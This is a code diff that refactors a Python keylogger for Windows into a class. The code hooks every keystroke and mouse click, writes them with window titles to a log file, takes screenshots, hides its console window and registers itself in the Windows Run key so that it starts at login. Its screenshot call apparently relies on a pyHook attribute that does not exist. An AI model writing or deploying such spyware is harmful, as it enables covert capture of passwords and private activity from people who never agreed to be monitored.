@@ -2,135 +2,105 @@
 # -*- coding: utf-8 -*-
 
 import sys
-import win32api, pythoncom
-import pyHook, os, time, random, string
+import os
+import time
+import random
+import string
+import win32console
+import win32gui
+import pythoncom
+import pyHook
 import winreg
-import ctypes
 
-global t, start_time, pics_names, interval
+LOG_FILE = 'Logfile.txt'
+INTERVAL = 60
 
-t = ""
-pics_names = []
+class Keylogger:
+    def __init__(self):
+        self.buffer = ""
+        self.pics_names = []
+        self.start_time = time.time()
 
+    def add_startup(self):
+        fp = os.path.dirname(os.path.realpath(__file__))
+        file_name = sys.argv[0].split('\\')[-1]
+        new_file_path = fp + '\\' + file_name
+        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        
+        try:
+            key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key2change, 'Im not a keylogger', 0, winreg.REG_SZ, new_file_path)
+            winreg.CloseKey(key2change)
+        except Exception as e:
+            print(f"Error adding to startup: {e}")
 
-try:
-    f = open('Logfile.txt', 'a')
-    f.close()
-except:
-    f = open('Logfile.txt', 'w')
-    f.close()
+    def hide_console(self):
+        win = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(win, 0)
 
-
-def addStartup():
-    # this will add the file to the startup registry key
-    fp = os.path.dirname(os.path.realpath(__file__))
-    file_name = sys.argv[0].split('\\')[-1]
-    new_file_path = fp + '\\' + file_name
-    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
-    winreg.SetValueEx(key2change, 'Im not a keylogger', 0, winreg.REG_SZ, new_file_path)
-
-
-def Hide():
-    import win32console
-    import win32gui
-
-    win = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(win, 0)
-
-
-addStartup()
-Hide()
-
-
-def ScreenShot():
-    global pics_names
-    import pyautogui
-
-    def generate_name():
+    def generate_name(self):
         return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
 
-    name = str(generate_name())
-    pics_names.append(name)
-    pyautogui.screenshot().save(name + '.png')
+    def screenshot(self):
+        name = self.generate_name()
+        self.pics_names.append(name)
+        pyHook.ImageGrab.grab().save(name + '.png')
 
+    def is_task_manager_open(self):
+        try:
+            hwnd = win32gui.FindWindow(None, "Task Manager")
+            return hwnd != 0
+        except:
+            return False
 
-def is_task_manager_open():
-    # Check if Task Manager window is open
-    import win32gui
+    def log_data(self, data):
+        with open(LOG_FILE, 'a') as log_file:
+            log_file.write(data)
 
-    try:
-        hwnd = win32gui.FindWindow(None, "Task Manager")
-        return hwnd != 0
-    except:
-        return False
+    def process_event(self, event):
+        return f'\n[{time.ctime().split(" ")[3]}] WindowName: {event.WindowName}\n'
 
+    def on_mouse_event(self, event):
+        data = self.process_event(event)
+        data += f'\tButton: {event.MessageName}\n\tClicked in (Position): {event.Position}\n===================='
+        self.buffer += data
+        if len(self.buffer) > 300:
+            self.screenshot()
+        self.check_log_interval()
 
-def OnMouseEvent(event):
-    global interval, t, start_time, pics_names
-    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
-           + ' WindowName : ' + str(event.WindowName)
-    data += '\n\tButton:' + str(event.MessageName)
-    data += '\n\tClicked in (Position):' + str(event.Position)
-    data += '\n===================='
+    def on_keyboard_event(self, event):
+        data = self.process_event(event)
+        data += f'\tKeyboard key: {event.Key}\n===================='
+        self.buffer += data
+        self.check_log_interval()
 
-    t = t + data
+    def check_log_interval(self):
+        if len(self.buffer) > 500:
+            self.log_data(self.buffer)
+            self.buffer = ''
 
-    if len(t) > 300:
-        ScreenShot()
+        if int(time.time() - self.start_time) == INTERVAL:
+            self.perform_custom_actions()
+            self.start_time = time.time()
 
-    if len(t) > 500:
-        f = open('Logfile.txt', 'a')
-        f.write(t)
-        f.close()
-        t = ''
+    def perform_custom_actions(self):
+        self.log_data("\n[Custom action performed]\n")
 
-    if int(time.time() - start_time) == int(interval):
-        # You can add custom actions here if needed
-        start_time = time.time()
-        t = ''
-
-    return True
-
-
-def OnKeyboardEvent(event):
-    global interval, t, start_time
-    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
-           + ' WindowName : ' + str(event.WindowName)
-    data += '\n\tKeyboard key :' + str(event.Key)
-    data += '\n===================='
-
-    t = t + data
-
-    if len(t) > 500:
-        f = open('Logfile.txt', 'a')
-        f.write(t)
-        f.close()
-        t = ''
-
-    if int(time.time() - start_time) == int(interval):
-        # You can add custom actions here if needed
-        start_time = time.time()
-        t = ''
-
-    if is_task_manager_open():
-        # Perform cleanup and exit the script when Task Manager is open
-        f = open('Logfile.txt', 'a')
-        f.write("\n[Script terminated: Task Manager is open]\n")
-        f.close()
+    def terminate_script(self):
+        self.log_data("\n[Script terminated]\n")
         sys.exit()
 
-    return True
+    def start_keylogger(self):
+        hook = pyHook.HookManager()
+        hook.KeyDown = self.on_keyboard_event
+        hook.MouseAllButtonsDown = self.on_mouse_event
+        hook.HookKeyboard()
+        hook.HookMouse()
+        pythoncom.PumpMessages()
 
 
-hook = pyHook.HookManager()
-
-hook.KeyDown = OnKeyboardEvent
-hook.MouseAllButtonsDown = OnMouseEvent
-
-hook.HookKeyboard()
-hook.HookMouse()
-
-start_time = time.time()
-
-pythoncom.PumpMessages()
+if __name__ == "__main__":
+    keylogger = Keylogger()
+    keylogger.add_startup()
+    keylogger.hide_console()
+    keylogger.start_keylogger()
